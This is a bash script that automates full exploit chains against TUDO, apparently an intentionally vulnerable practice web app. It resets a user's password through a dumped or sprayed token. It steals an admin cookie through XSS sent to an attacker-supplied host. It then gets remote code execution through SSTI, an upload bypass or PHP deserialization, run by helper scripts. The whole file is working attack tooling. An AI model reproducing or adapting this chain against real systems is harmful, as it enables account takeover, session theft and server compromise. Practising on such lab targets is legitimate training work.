#!/bin/bash

# @title  Chains together vulnerabilities for TUDO
# @author William Moody
# @date   10.03.2021

if [ "$#" -ne 4 ] || [ $4 -gt 6 ] || [ $4 -lt 1 ]; then
	echo "usage: $0 TARGET HOST USER CHAIN"
	echo 
	echo "valid CHAIN values:"
	echo "1 :: SQLi -> XSS -> SSTI"
	echo "2 :: SQLi -> XSS -> Image Upload Bypass"
	echo "3 :: SQLI -> XSS -> PHP Deserialization"
	echo "4 :: Token Spray -> XSS -> SSTI"
	echo "5 :: Token Spray -> XSS -> Image Upload Bypass"
	echo "6 :: Token Spray -> XSS -> PHP Deserialization"
	echo
	exit
fi

new_pass=HACKED
cookie_tmp=.TMPCOOKIEOUTPUT

echo
echo "Step 1 - Authentication Bypass"
echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="

if [ $4 -lt 4 ]; then
	python3 dump_token.py $1 $3 $new_pass

else
	python3 token_spray.py $1 $3 $new_pass
fi

echo
echo "Step 2 - Privilege Escalation"
echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
echo

python3 steal_cookie.py $1 $2 $3 $new_pass | tee $cookie_tmp
phpsessid=`tail -n 1 $cookie_tmp | awk '{split($0,a,"="); print a[2]}'`
rm $cookie_tmp

echo
echo "Step 3 - RCE"
echo "-=-=-=-=-=-="
echo

if [ $(($4%4)) -eq 1 ]; then
	python3 set_motd.py $1 $2 $phpsessid

elif [ $(($4%4)) -eq 2 ]; then
	python3 image_upload.py $1 $2 $phpsessid

else
	python3 deserialize.py $1 $2 $phpsessid
fi
